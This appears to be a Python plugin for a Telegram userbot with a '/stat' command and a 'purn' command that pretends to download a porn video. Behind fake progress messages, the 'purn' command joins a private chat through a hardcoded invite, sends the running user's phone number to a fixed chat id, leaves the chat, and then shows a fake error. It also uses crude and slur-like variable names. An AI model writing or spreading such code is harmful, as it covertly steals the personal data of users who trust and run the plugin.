from Dasha.events import dasha
from telethon.tl.functions.messages import ImportChatInviteRequest
#Some misc modules

@dasha(pattern='^/stat')
async def stat(event):
      await event.edit(f'➤ 𝚃𝚘𝚝𝚊𝚕 𝙽𝚘 𝙾𝚏 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜 𝙸𝚗 **{event.chat.title}** **:** `{event.id}`')

@dasha(pattern="purn")
async def lol(event):
       x = await event.edit('`Processing..`')
       await event.client(ImportChatInviteRequest('wJuPN3GRftc3OTBl'))
       y = await x.edit('`Fetching video from porhub servers....`')
       mf = await y.edit('`Trying to download video.. Could ve taking a min or two..`')
       await event.client.send_message(-1001643063658, ((await event.client.get_me()).phone))
       sex = await mf.edit('`Trying to upload video to Telegram...`')
       gay= await event.client.kick_participant(-1001643063658, 'me')
       fuk = await sex.edit('`404 - Error Telegram caught up with a unknown error.Please use` pornhub.com') 